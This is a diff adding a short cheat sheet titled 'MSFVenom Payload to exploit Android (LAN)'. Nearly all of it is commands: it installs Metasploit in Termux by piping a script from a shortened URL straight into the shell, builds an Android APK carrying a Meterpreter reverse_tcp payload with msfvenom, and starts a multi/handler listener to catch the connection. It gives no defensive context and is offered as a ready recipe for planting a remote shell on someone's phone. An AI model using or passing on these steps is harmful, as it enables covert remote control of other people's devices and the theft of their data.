@@ -1,0 +1,23 @@
+# MSFVenom Payload to exploit Android (LAN)
+
+# Install Metasploit Framework in Termux
+source <(curl -fsSL https://kutt.it/msf)
+
+# Create MSFVenom Payload
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<localhost_ip_receive> LPORT=<localhost_port_listen> R app_name.apk
+
+# Start Metasploit Console
+msfconsole
+
+# Set Listener on Metasploit
+use exploit/multi/handler
+
+# Set Reverse Payload
+set payload android/meterpreter/reverse_tcp
+
+# Set localhost IP to receive and port to listen connections
+set LHOST=<Receive_IP>
+LPORT=<Receive_Port>
+
+# Start the listener
+run / exploit
